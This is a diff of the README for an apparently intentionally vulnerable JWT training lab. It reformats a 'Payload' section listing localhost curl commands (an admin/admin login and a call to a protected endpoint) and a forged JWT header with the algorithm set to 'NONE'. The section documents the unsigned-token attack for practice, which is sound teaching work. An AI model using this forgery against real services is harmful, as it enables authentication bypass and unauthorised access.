@@ -33,10 +33,12 @@ install from my dockerhub : https://hub.docker.com/r/mhnamadi/jwt-none
 
 ## Payload 
 
-#curl --header "Content-Type: application/json" --request POST --data '{"username":"admin","password":"admin"}' http://
-localhost:5000/auth
-#curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:5000/protected
-#Null cipher header: eyJ0eXAiOiJKV1QiLCAiYWxnIjoiTk9ORSJ9.
+* curl --header "Content-Type: application/json" --request POST --data '{"username":"admin","password":"admin"}' http://localhost:5000/auth
+
+
+* curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:5000/protected
+
+* Null cipher header: eyJ0eXAiOiJKV1QiLCAiYWxnIjoiTk9ORSJ9.
 
 ## Attack
 
